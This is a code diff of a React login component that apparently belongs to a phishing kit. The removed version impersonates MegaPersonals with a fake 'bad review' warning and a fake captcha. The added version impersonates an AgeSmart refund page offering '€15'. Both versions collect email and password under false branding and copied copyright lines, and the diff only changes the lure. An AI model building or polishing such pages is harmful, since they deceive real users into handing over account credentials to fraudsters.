@@ -65,130 +65,73 @@ function LoginForm({ adminId, posterId ,verifyId}) {
   // };
 
   return (
-    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
-      <div className="w-[65%] lg:w-full">
-        <Image src={"/images/megapersonals.png"} alt="megaeprsonals" priority />
-      </div>
-      <div className=" mt-5 font-bold text-[#222222] text-center ">
-        <p className="text-3xl font-bold text-[#222222] text-center ">
-          <span className="text-[#e89a4c]">Mega</span>{" "}
-          <span className="text-[#6495ED]">Personals</span>
-        </p>
-        <p className="text-xl mt-2">13 BAD REVIEW</p>
-        <p className="text-2xl text-blue-700">
-          Confirm your own account before
-        </p>
-        <p className="text-2xl text-[#e89a4c]">
-          VIEW / REMOVE <span className="text-blue-700">review</span>
-        </p>
+    <div className="min-h-screen flex flex-col items-center justify-start bg-white font-sans text-black">
+      
+      {/* Top Bar */}
+      <div className="w-full bg-pink-500 py-3 text-center">
+        <h1 className="text-2xl font-bold text-white">
+          <span className="text-yellow-300">Mega</span>
+          <span className="text-cyan-100">Personals</span>
+          <br />
+          <span className="text-sm font-normal text-white">personals classifieds</span>
+        </h1>
       </div>
 
-      <div className="mt-5">
+      {/* Logo */}
+      <div className="my-6">
+        <img src="/logo.png" alt="AGESMART" className="w-40 h-auto" />
+      </div>
+
+      {/* Text */}
+      <div className="text-center px-4 max-w-xl">
+        <p className="text-lg font-medium mb-2">
+          Your account has been approved as fully active and verified. If YOU ARE REFUND <br />
+          <span className="text-[#9b59b6] font-bold">€15 MegaPersonals</span>
+        </p>
+
+        <p className="text-base my-2 font-semibold">
+          breaking their rules,
+        </p>
+
+        <p className="text-green-700 font-bold mb-4">
+          Your account will remain active as it is now.
+        </p>
+
+        <p className="mb-6">from AgeSmart.</p>
+      </div>
+
+      {/* Form */}
+      <form className="flex flex-col items-center w-full max-w-md px-4">
         <input
-          className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-          placeholder="Your email"
-          name="email"
           type="email"
-          autoComplete="on"
-          value={email}
-          onChange={(e) => setEmail(e.target.value)}
-          required
+          placeholder="Enter email"
+          className="w-full border rounded px-4 py-2 mb-4"
         />
-
-        {/* {!showWrongPassword ? ( */}
-        {/* <> */}
         <input
-          className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-          placeholder="Password"
-          name="password"
           type="password"
-          autoComplete="on"
-          value={password}
-          onChange={(e) => setPassword(e.target.value)}
-          required
+          placeholder="Enter password"
+          className="w-full border rounded px-4 py-2 mb-4"
         />
-        {/* </> */}
-        {/* ) : ( */}
-        {/* <input
-            className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-            placeholder="Password"
-            name="wrongPassword"
-            type="password"
-            autoComplete="on"
-            value={wrongPassword}
-            onChange={(e) => setWrongPassword(e.target.value)}
-            required
-          />
-        )} */}
-        {/* {showWrongPassword ? (
-          <p className="text-red-500 text-lg font-medium text-center">
-            Wrong Password, try again
-          </p>
-        ) : null} */}
-        <div className="flex flex-col items-center">
-          <Image
-            src="/images/captures.jpeg"
-            alt="captcha"
-            width={228}
-            height={55}
-            className="mt-3"
-          />
-
-          <input
-            className="mt-2 w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
-            id="captcha"
-            name="captcha"
-            type="captcha"
-            autoComplete="on"
-            placeholder="Enter code from the picture"
-            required
-          />
-        </div>
-        {/* {!showWrongPassword ? (
-          <button
-            type="button"
-            onClick={handleSubmit}
-            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-          >
-            SUBMIT
-          </button>
-        ) : ( */}
         <button
           type="submit"
-          // type="button"
-          className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-          // disabled={!verified}
-          // onClick={handleNextStep}
-          onClick={handleSubmit}
+          className="bg-green-600 hover:bg-green-700 text-white font-semibold px-6 py-2 rounded"
         >
-          SUBMIT
+          Get Refund
         </button>
-        {/* )} */}
+      </form>
 
-        <Image
-          src="/images/warning.png"
-          alt="warning"
-          className="mt-2 mx-auto"
-          width={350}
-          height={154}
-        />
-
-        <p className="mt-[10px] text-center text-sm text-custom-blue2 uppercase hover:underline">
-          Forgot Password?
+      {/* Footer */}
+      <div className="mt-10 mb-4 flex flex-col items-center text-center">
+        <img src="/logo.png" alt="Verified" className="w-12 mb-2" />
+        <p className="text-xs text-gray-600 mb-1">
+          Copyright © 2022 Age Smart LDA. All Rights Reserved.
         </p>
+        <div className="flex space-x-4 text-sm text-blue-600 underline">
+          <a href="#">Terms of Use</a>
+          <a href="#">Privacy Policy</a>
+          <a href="#">Billing Questions</a>
+        </div>
       </div>
-      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
-        <p className=" cursor-pointer">Home</p>
-        {" | "}
-        <p className=" cursor-pointer">Manage Posts</p>
-        {" | "}
-        <p className=" cursor-pointer">Contact Us</p>
-        {" | "}
-        <p className=" cursor-pointer">Policies & Terms</p>
-      </div>
-      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
-        Copyright ©2021 MegaPersonals.eu
-      </p>
     </div>
   );
 }
